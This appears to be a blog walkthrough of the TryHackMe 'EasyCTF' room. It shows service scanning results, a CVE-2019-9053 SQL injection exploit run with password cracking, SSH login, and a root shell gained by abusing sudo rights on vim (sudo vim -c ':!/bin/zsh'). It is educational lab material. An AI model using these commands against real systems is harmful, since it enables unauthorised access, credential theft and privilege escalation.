---
title: Write-up — EasyCTF
date: 2025-06-29 10:00:00 AM
categories: [Write-up, Try Hack Me]
tags: [Try Hack Me, Write-up, ctf, Easy]
image: 'assets/img/articles/EasyCTF.png'
description: The "EasyCTF" room on TryHackMe is designed as a beginner-friendly Capture The Flag (CTF) challenge. It is an excellent starting point for individuals who are new to CTFs and penetration testing.
---

> Walkthrough of room EasyCTF from TryHackMe :
> [https://tryhackme.com/room/easyctf](https://tryhackme.com/room/easyctf)

The room covers fundamental skills necessary for CTFs, including **scanning** and **enumeration**, research, **exploitation**, and **privilege escalation**. This makes it a great introduction to the basics of cybersecurity and ethical hacking.

---

### How many services are running under port 1000?

2 services running, **ftp** and **http**.

### What is running on the higher port?

SSH on port 2222.

### What's the CVE you're using against the application?

CMS Made simple version 2.2.8 -> **CVE-2019-9053**

### To what kind of vulnerability is the application vulnerable?

SQLi (https://www.exploit-db.com/exploits/46635)

### What's the password?

```bash
./exploit.py -u http://$TARGET/simple/ -c -w /usr/share/wordlists/rockyou.txt

[+] Salt found: 1dac0d92e9fa6bb2
[+] Username found: *****
[+] Email found: admin@admin.com
[+] Password hash found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: ******
```

`-c` for enabling cracking.

### Where can you login with the details obtained?

Through `ssh` on port 2222.

### What's the user flag?

The user flag can be retrieve by doing:

```bash
cat user.txt
```

### Is there any other user in the home directory? What's its name?

```bash
ls ..
mitch  sunbath
```

The other user is **`sunbath`**.

### What can you leverage to spawn a privileged shell?

```bash
sudo -l

User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

By abusing **vim** privilege misconfiguration.

### What's the root flag?

```bash
sudo vim -c ':!/bin/zsh'

# Hit Enter

:r!cat /root/root.txt
```


All flags down, mission passed.

![](https://media1.tenor.com/m/lQBJJmatxPYAAAAd/mission-accomplished-penguins.gif)

Be proud of what you’ve accomplished.

See you soon!

> “You can’t have privacy without good security. Anyone saying otherwise is delusional.”

> ― Dr. Larry Ponemon, Founder, Ponemon Institute

## Comments
<script src="https://giscus.app/client.js"
        data-repo="Deomorphisme/Deomorphisme.github.io"
        data-repo-id="R_kgDONEIr-Q"
        data-category="General"
        data-category-id="DIC_kwDONEIr-c4CjomU"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="preferred_color_scheme"
        data-lang="en"
        data-loading="lazy"
        crossorigin="anonymous"
        async>
</script>
